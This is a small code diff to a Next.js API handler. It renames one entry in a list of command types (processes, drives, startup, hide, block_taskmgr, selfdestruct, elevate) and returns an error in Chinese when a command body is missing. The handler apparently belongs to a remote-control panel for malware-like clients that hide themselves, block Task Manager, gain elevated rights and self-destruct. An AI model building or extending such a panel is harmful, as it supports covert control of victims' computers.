@@ -73,7 +73,7 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
         break
       }
       
-      const noContentTypes = ['processes', 'drives', 'startup', 'hide', 'blocktaskmgr', 'selfdestruct', 'elevate']
+      const noContentTypes = ['processes', 'drives', 'startup', 'hide', 'block_taskmgr', 'selfdestruct', 'elevate']
       if (!command && !noContentTypes.includes(type)) {
         res.status(400).json({ status: 'error', message: '缺少命令内容' })
         break
